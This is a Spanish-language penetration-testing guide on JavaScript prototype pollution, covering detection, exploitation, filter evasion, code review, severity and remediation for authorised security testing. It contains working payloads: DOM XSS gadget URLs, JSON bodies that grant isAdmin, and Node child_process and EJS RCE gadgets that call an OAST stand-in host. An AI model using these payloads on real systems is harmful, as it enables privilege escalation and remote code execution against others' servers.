# Contaminación de prototipos (Prototype Pollution)

| Clasificación | |
|---|---|
| CWE | CWE-1321 — Modificación controlada incorrectamente de atributos del prototipo de un objeto. Padre: CWE-915 (modificación de atributos determinados dinámicamente) |
| OWASP Top 10:2025 | A08 — Software or Data Integrity Failures (A05 — Injection cuando termina en XSS o ejecución de comandos) |
| OWASP API Top 10:2023 | API3 — Broken Object Property Level Authorization (cuerpos JSON fusionados sin control de propiedades) |
| WSTG | Sin identificador propio; se prueba dentro de WSTG-CLNT-01 (DOM) y WSTG-INPV (validación de entrada en servidor) |

**Contenido:** 1. Qué es · 2. Dónde buscar · 3. Detección segura (cliente y servidor sin DoS) · 4. Explotación (gadgets de cliente → XSS; servidor Node → elevación, RCE) · 5. Evasión de filtros · 6. Escalada · 7. Caja blanca · 8. Falsos positivos · 9. Evidencia · 10. Severidad · 11. Remediación · 12. Herramientas · 13. Referencias

---

## 1. Qué es y por qué ocurre

En JavaScript casi todos los objetos heredan de `Object.prototype`. Cuando se lee una propiedad que el objeto no tiene, el motor la busca en su cadena de prototipos. Si un atacante consigue **escribir** en `Object.prototype` (a través de la clave especial `__proto__` o de `constructor.prototype`), esa propiedad aparece «por arte de magia» en **todos** los objetos de la página o del proceso Node.

Hacen falta dos piezas:

1. **Fuente de contaminación**: código que copia claves controladas por el usuario de forma recursiva sin filtrarlas. Ejemplos: una función de fusión profunda (*deep merge*), una función que asigna por ruta (`set(obj, 'a.b.c', valor)`), un analizador de query string que crea objetos anidados (`?a[b]=c`).
2. **Gadget**: código legítimo que lee una propiedad normalmente inexistente (`options.url`, `config.isAdmin`, `opts.shell`) y la usa en algo peligroso. Al estar contaminada, toma el valor del atacante.

Consecuencias: en el **navegador**, XSS basado en DOM; en el **servidor** (Node.js), cambio de lógica (elevación de privilegios), denegación de servicio y, con gadgets adecuados, ejecución remota de comandos. Lo crítico del lado servidor: la contaminación **persiste durante toda la vida del proceso** y afecta a **todos los usuarios**.

`JSON.parse('{"__proto__":{"x":1}}')` no contamina por sí solo (crea una propiedad propia llamada `__proto__`); la contaminación ocurre cuando ese objeto se **fusiona** en otro mediante asignaciones `target[clave] = valor`.

Análogos en otros lenguajes: *class pollution* en Python (`__class__.__init__.__globals__` mediante funciones de fusión recursiva sobre atributos) y en Ruby; se prueban con la misma lógica.

## 2. Dónde buscar (señales del reconocimiento)

- **Cliente**: SPA que analizan `location.search`/`location.hash` en objetos anidados (bibliotecas tipo `deparam`, `qs`, `query-string` antiguas, `purl`, código propio), configuración leída de la URL o de `postMessage`, uso de `$.extend(true, …)`, `_.merge`, `_.defaultsDeep`.
- **Servidor Node**: endpoints que aceptan JSON y lo fusionan en objetos de configuración o de usuario (`PATCH /api/profile`, `/settings`, preferencias, importación de JSON/YAML), cabecera `X-Powered-By: Express`, errores de Node en respuestas.
- Bibliotecas vulnerables conocidas en el reconocimiento (`package.json`, `package-lock.json`, *source maps*): jQuery < 3.4.0 (CVE-2019-11358, `$.extend`), lodash < 4.17.5 (CVE-2018-3721, `merge`) y < 4.17.12 (CVE-2019-10744, `defaultsDeep`), y versiones antiguas de `deep-extend`, `merge`, `mixin-deep`, `set-value`, `dot-prop`, `hoek`.
- Respuestas JSON que devuelven el objeto completo tras actualizarlo (permiten ver la contaminación reflejada).

## 3. Detección segura (primeras sondas, no destructivas)

### 3.1 Lado cliente

Añadir a la URL y comprobar en la consola de DevTools si `Object.prototype` tiene la propiedad:

```text
https://t.example/?__proto__[crvs]=pp1
https://t.example/?__proto__.crvs=pp1
https://t.example/?constructor[prototype][crvs]=pp1
https://t.example/?constructor.prototype.crvs=pp1
https://t.example/#__proto__[crvs]=pp1
https://t.example/#/ruta?__proto__[crvs]=pp1
```
```javascript
// En la consola, tras cargar la página
({}).crvs          // "pp1" → contaminación confirmada
Object.prototype.crvs
```

DOM Invader (Burp) automatiza esta comprobación y además busca gadgets.

### 3.2 Lado servidor sin DoS

⚠️ Cualquier contaminación en servidor afecta a **todos** los usuarios del proceso hasta que se reinicie. Usar nombres de propiedad únicos e inocuos, preferir un entorno de preproducción y **pedir confirmación explícita del cliente** antes de contaminar propiedades que cambian comportamiento global (estado HTTP, cabeceras, `json spaces`). Anotar cada propiedad contaminada y avisar al cliente para que reinicie el servicio al terminar.

Técnicas de detección «a ciegas» publicadas por PortSwigger (Gareth Heyes, 2023):

1. **Reflejo de propiedad** (la más inocua): enviar en un cuerpo JSON que la aplicación fusiona
   ```json
   {"nombre":"prueba","__proto__":{"crvs7x9q":"pp"}}
   ```
   y comprobar si en respuestas posteriores (incluso de otros endpoints que serializan objetos con `for…in` o devuelven el objeto fusionado) aparece `"crvs7x9q":"pp"` sin haberlo enviado.
2. **Cambio del código de estado** en errores: contaminar `{"__proto__":{"status":555}}` y después enviar un JSON mal formado; si el error vuelve con estado **555**, hay contaminación (gadget de `http-errors`/`body-parser`). ⚠️ Afecta a las respuestas de error de todos.
3. **Indentación de JSON** (Express): `{"__proto__":{"json spaces":10}}` → las respuestas JSON pasan a ir indentadas (corregido en versiones recientes de Express). ⚠️ Global; revertir con `{"__proto__":{"json spaces":0}}`.
4. **Juego de caracteres**: `{"__proto__":{"content-type":"application/json; charset=utf-7"}}` y luego enviar un valor en UTF-7 (`+AGYAbwBv-` = `foo`); si se refleja decodificado, hay contaminación.
5. **CORS expuesto** (middleware `cors`): `{"__proto__":{"exposedHeaders":["crvs7x9q"]}}` → aparece `Access-Control-Expose-Headers: crvs7x9q`.
6. **Opciones del analizador de query** (`qs`): `{"__proto__":{"allowDots":true}}` y después `?a.b=c` se interpreta como objeto; o `{"__proto__":{"parameterLimit":1}}` (⚠️ rompe peticiones con varios parámetros para todos).

Probar el mismo contenido en `constructor.prototype` (sección 5) si `__proto__` se filtra.

## 4. Explotación por contexto o tecnología

### 4.1 Gadgets de cliente → XSS basado en DOM

Patrón típico de código con gadget:

```javascript
let config = {};                                // sin transport_url propio
let src = config.transport_url || '/default.js';
let s = document.createElement('script'); s.src = src; document.body.appendChild(s);
```
```text
https://t.example/?__proto__[transport_url]=data:,alert(document.domain)//
```

Otros gadgets genéricos (buscar propiedades leídas de objetos de opciones y usadas en sumideros):

```text
?__proto__[innerHTML]=<img src=x onerror=alert(1)>
?__proto__[src]=data:,alert(1)//
?__proto__[href]=javascript:alert(1)
?__proto__[onload]=alert(1)
?__proto__[sequence]=alert(1)-          # gadget que concatena en eval()
?__proto__[srcdoc][]=<script>alert(1)</script>
```

Gadgets documentados en bibliotecas populares (repositorio *client-side-prototype-pollution* de BlackFan; **verificar la versión** antes de usarlos):

```text
# jQuery ($.get / $.ajax): carga de script
?__proto__[url][]=data:,alert(1)//&__proto__[dataType]=script
# jQuery (manipulación con contexto)
?__proto__[context]=<img/src/onerror%3dalert(1)>&__proto__[jquery]=x
# Google reCAPTCHA
?__proto__[srcdoc][]=<script>alert(1)</script>
# DOMPurify antiguo (permitir atributos peligrosos)
?__proto__[ALLOWED_ATTR][0]=onerror&__proto__[ALLOWED_ATTR][1]=src
# Google Analytics / Tag Manager
?__proto__[hitCallback]=alert(1)
```

Fuentes alternativas: `postMessage` con JSON que se fusiona (`{"__proto__":{"x":"y"}}`), `localStorage` con configuración, JSON de API reflejado del usuario.

### 4.2 Servidor (Node.js): alteración de lógica y elevación de privilegios

```javascript
// Código vulnerable
const user = await db.getUser(id);              // { name, email }  (sin isAdmin)
merge(user, req.body);                          // fusión profunda sin filtrar
if (user.isAdmin) { /* … */ }                   // gadget: undefined → heredado
```
```json
{"__proto__": {"isAdmin": true}}
```
⚠️ Esto convertiría en administradores a **todos** los objetos sin `isAdmin` propio (todos los usuarios) mientras viva el proceso: **requiere confirmación explícita del cliente**, solo en preproducción, y con reinicio posterior acordado. En producción, limitarse a la detección del apartado 3.2 y describir el gadget a partir del código o del comportamiento.

### 4.3 Servidor: ejecución remota (RCE) mediante gadgets de `child_process`

Si en algún punto el proceso llama a `spawn`, `exec`, `execSync` o `fork` con un objeto de opciones sin definir ciertas propiedades, estas se heredan del prototipo contaminado. Cargas de confirmación con callback a un servidor OAST propio (sin ejecutar nada más):

```json
{"__proto__": {"shell": "node", "NODE_OPTIONS": "--inspect=<id>.oast.example"}}
```
(el proceso hijo intenta conectar el inspector a ese host: una resolución DNS confirma el gadget)

```json
{"__proto__": {"execArgv": ["--eval=require('child_process').execSync('nslookup <id>.oast.example')"]}}
```
(gadget de `fork()`)

```json
{"__proto__": {"shell": "vim", "input": ":! nslookup <id>.oast.example\n"}}
```
(gadget de `execSync()` cuando `vim` está instalado)

```json
{"__proto__": {"env": {"AAAA": "console.log(require('child_process').execSync('nslookup <id>.oast.example').toString())//"}, "NODE_OPTIONS": "--require /proc/self/environ"}}
```
(gadget clásico vía variables de entorno en Linux; depende de la versión de Node)

⚠️ Toda prueba de RCE **requiere confirmación explícita del cliente**; usar solo comandos de confirmación (resolución DNS a dominio propio), nunca shells inversas ni lectura de ficheros sin autorización.

### 4.4 Gadgets en motores de plantillas (Node)

- **EJS**: opciones `outputFunctionName`, `escapeFunction` (+ `client: true`) concatenadas en el código generado (corregido en versiones recientes; comprobar versión).
  ```json
  {"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('nslookup <id>.oast.example');x"}}
  ```
- **Pug**: nodos AST heredados (`block`, `line`) en compilación.
- **Handlebars**: estructuras AST contaminadas en `compile`.

Ver también `vulns/ssti.md`.

### 4.5 Denegación de servicio

Contaminar `toString`, `valueOf`, `hasOwnProperty` o propiedades que usan los analizadores (`parameterLimit`) rompe la aplicación para todos. ⚠️ No ejecutar en producción; describirlo como impacto potencial.

## 5. Evasión de filtros

```json
{"constructor": {"prototype": {"crvs": "pp"}}}
{"__proto__": {"crvs": "pp"}}
{"__pro__proto__to__": {"crvs": "pp"}}
```
```text
?constructor[prototype][crvs]=pp
?__proto__.crvs=pp
?__pro__proto__to__[crvs]=pp            # filtros que eliminan "__proto__" una sola vez
?__proto__[crvs]=pp&__proto__[crvs]=pp  # combinar con contaminación de parámetros
?a[__proto__][crvs]=pp
```

- Los escapes Unicode en claves JSON los decodifica `JSON.parse`, así que pasan filtros/WAF que buscan la cadena literal `__proto__`.
- Cambiar `Content-Type` (JSON ↔ `x-www-form-urlencoded` con notación de corchetes) para pasar por otro analizador.
- Rutas por punto o por array en funciones `set`: `"__proto__.crvs"`, `["__proto__","crvs"]`, `"constructor.prototype.crvs"`.

## 6. Escalada y encadenamiento (demostrar impacto máximo sin causar daño)

- **Cliente**: contaminación + gadget → `alert(document.domain)`; después escalar como un XSS (ver `vulns/xss.md`). Es reflejado (solo afecta a quien abre el enlace): seguro de demostrar.
- **Servidor**: demostrar primero con la técnica de reflejo de propiedad (3.2.1); para RCE, solo callback DNS/HTTP a un dominio propio y con autorización.
- Cadenas: contaminación que desactiva un saneador (DOMPurify `ALLOWED_ATTR`), que cambia URLs de scripts, que añade `isAdmin`/`role`, que altera opciones de `child_process` o de motores de plantillas; contaminación de parámetros para eludir WAF (ver `vulns/parameter-pollution.md`).
- Informar al cliente de qué propiedades quedaron contaminadas en el proceso y solicitar reinicio.

## 7. Caja blanca: fuentes, sumideros y patrones de código

```javascript
// Fuente vulnerable: fusión recursiva sin filtrar claves
function merge(target, source) {
  for (const key in source) {
    if (typeof source[key] === 'object' && source[key] !== null) {
      if (!target[key]) target[key] = {};
      merge(target[key], source[key]);          // key === "__proto__" → target["__proto__"] es Object.prototype
    } else target[key] = source[key];
  }
}
// Asignación por ruta vulnerable
function setPath(obj, path, val) { const p = path.split('.'); let o = obj;
  for (let i = 0; i < p.length - 1; i++) o = o[p[i]] ??= {}; o[p.at(-1)] = val; }

// Seguro
const BLOCKED = new Set(['__proto__', 'constructor', 'prototype']);
function safeMerge(target, source) {
  for (const key of Object.keys(source)) {
    if (BLOCKED.has(key)) continue;
    const v = source[key];
    if (v && typeof v === 'object' && !Array.isArray(v)) {
      if (!Object.hasOwn(target, key)) target[key] = Object.create(null);
      safeMerge(target[key], v);
    } else target[key] = v;
  }
  return target;
}
// Gadget seguro: comprobar propiedad propia
if (Object.hasOwn(user, 'isAdmin') && user.isAdmin === true) { … }
```

Patrones a revisar:

- `for…in` + asignación recursiva; `Object.keys` no basta si luego se accede por `target[key]` con `key === '__proto__'` procedente de `JSON.parse`.
- `_.merge`, `_.mergeWith`, `_.defaultsDeep`, `_.set`, `_.setWith`, `_.zipObjectDeep`, `$.extend(true, …)`, `deepmerge`, `deep-extend`, `merge`, `mixin-deep`, `set-value`, `dot-prop`, `object-path`, `flat.unflatten`.
- Objetos de opciones con valores por defecto leídos sin `hasOwn`: `opts.shell`, `opts.env`, `options.url`, `config.isAdmin`.
- Llamadas a `child_process` con objetos de opciones parciales; plantillas compiladas con opciones procedentes de la petición.

```bash
rg -n '__proto__|constructor\s*\[\s*["'\'']prototype|\.merge\(|mergeWith\(|defaultsDeep\(|zipObjectDeep\(|_\.set\(|setWith\(|\$\.extend\(\s*true|deepmerge|deep-extend|mixin-deep|set-value|dot-prop|object-path|unflatten\(' -g '!node_modules'
rg -n 'for\s*\(\s*(const|let|var)\s+\w+\s+in\s+' -g '*.{js,ts}' -g '!node_modules'      # revisar asignaciones recursivas
rg -n 'child_process|spawn\(|execSync\(|exec\(|fork\(' -g '*.{js,ts}' -g '!node_modules' # gadgets RCE
npm ls lodash jquery deep-extend set-value mixin-deep dot-prop 2>/dev/null; npm audit --omit=dev
```

```bash
semgrep --config p/javascript --config p/nodejs .   # incluyen reglas de prototype pollution (bucles de fusión, asignación por clave dinámica)
```

## 8. Falsos positivos frecuentes

- La URL contiene `__proto__[x]` pero `({}).x` sigue siendo `undefined`: el analizador lo ignora (por ejemplo, `qs` con `allowPrototypes:false`, valor por defecto).
- La respuesta del servidor refleja `"__proto__":{…}` como propiedad propia (eco del JSON) sin contaminar el prototipo: comprobar con un objeto **distinto** o en una petición posterior.
- Contaminación confirmada sin gadget explotable: reportar con severidad baja/media según contexto (en servidor, el riesgo de DoS suele justificar media).
- Escáneres que marcan `npm audit` de lodash/jQuery vulnerables sin que se use la función afectada con datos del usuario.
- Objetos creados con `Object.create(null)` o `Map`: no heredan de `Object.prototype`.

## 9. Evidencia mínima para validarlo

- **Cliente**: URL de prueba + captura de consola con `({}).crvs === 'pp1'` + (si hay gadget) captura de ejecución con `document.domain` y referencia al código del gadget (fichero y línea).
- **Servidor**: petición de contaminación, petición posterior que muestra el efecto (propiedad reflejada, estado 555, cabecera expuesta) y registro OAST si hubo gadget RCE; lista de propiedades contaminadas y confirmación de reinicio/limpieza.
- Versión de bibliotecas implicadas.

## 10. Severidad orientativa (vectores CVSS 3.1 y 4.0 típicos según impacto demostrado)

| Escenario | CVSS 3.1 | CVSS 4.0 (calcular con la calculadora de FIRST) |
|---|---|---|
| Cliente: contaminación → DOM XSS | `AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N` = 6.1 | `AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N` |
| Cliente: contaminación sin gadget | Bajo / informativo | — |
| Servidor: DoS | `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` = 7.5 | `AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N` |
| Servidor: elevación de privilegios (usuario autenticado) | `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N` = 8.1 | `AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N` |
| Servidor: RCE sin autenticación | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` = 9.8 | `AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` |
| Servidor: RCE con cuenta | `…/PR:L/…` = 8.8 | `PR:L` |

Si el gadget depende de una ruta de código poco frecuente o de una versión concreta, considerar `AC:H` (3.1) o `AT:P` (4.0).

## 11. Remediación (con ejemplo de código correcto)

1. Filtrar las claves `__proto__`, `constructor` y `prototype` en toda fusión, clonación o asignación por ruta (o usar bibliotecas actualizadas que lo hagan).
2. Usar `Object.create(null)` o `Map` para diccionarios con claves del usuario.
3. Validar cuerpos con esquema estricto (JSON Schema/`zod`/`joi` con `additionalProperties: false`) antes de fusionar.
4. Comprobar propiedades propias (`Object.hasOwn`) en decisiones de seguridad y pasar objetos de opciones completos (con todas las propiedades definidas) a `child_process` y motores de plantillas.
5. Endurecer el proceso: `Object.freeze(Object.prototype)` al arranque (probar compatibilidad) o Node con `--disable-proto=delete` (o `=throw`).
6. Actualizar dependencias (`npm audit`, Dependabot/Renovate).

```javascript
// Arranque de la aplicación
Object.freeze(Object.prototype);
Object.freeze(Array.prototype);
// Validación con esquema
import { z } from 'zod';
const Profile = z.object({ name: z.string().max(80), bio: z.string().max(500) }).strict();
app.patch('/api/profile', (req, res) => {
  const data = Profile.parse(req.body);          // rechaza __proto__ y claves extra
  Object.assign(req.user, data);
  res.json({ ok: true });
});
```

## 12. Herramientas (comando y cuándo usarla; automatización solo tras confirmación manual, nunca como primer barrido)

| Herramienta | Uso | Cuándo |
|---|---|---|
| DOM Invader (navegador de Burp, modo *Prototype pollution*) | Detecta fuentes y escanea gadgets en cliente | Primera opción en SPA |
| DevTools | `({}).x`, breakpoints en lectura de propiedades (`Object.defineProperty(Object.prototype,'x',{get(){debugger}})`) | Localizar el gadget |
| Burp — *Server-Side Prototype Pollution Scanner* (BApp) | Técnicas no destructivas del apartado 3.2 | Servidor Node, tras revisar con el cliente el riesgo global |
| ppmap | `echo 'https://t.example/' \| ppmap` | Triaje de URLs para contaminación en cliente |
| ppfuzz | `ppfuzz -l urls.txt` | Triaje masivo en cliente |
| Burp Collaborator / interactsh | Confirmar gadgets RCE | Solo con autorización |
| `npm audit`, `semgrep`, `rg` | Sección 7 | Caja blanca |

## 13. Referencias

- PortSwigger Web Security Academy — Prototype pollution (cliente y servidor); Gareth Heyes, «Server-side prototype pollution: Black-box detection without the DoS» (2023).
- Olivier Arteau, «Prototype pollution attack in NodeJS application» (NorthSec 2018).
- BlackFan — repositorio *client-side-prototype-pollution* (gadgets por biblioteca).
- Shcherbakov, Balliu, Staicu — «Silent Spring: Prototype Pollution Leads to Remote Code Execution in Node.js» (USENIX Security 2023).
- Michał Bentkowski — gadgets RCE vía `child_process` (Kibana, 2019).
- HackTricks — *Prototype Pollution* (cliente, Node RCE, *Python class pollution*).
- PayloadsAllTheThings — *Prototype Pollution*.
- MDN — Inheritance and the prototype chain; `Object.hasOwn`; documentación de Node `--disable-proto`.
- CWE-1321, CWE-915.
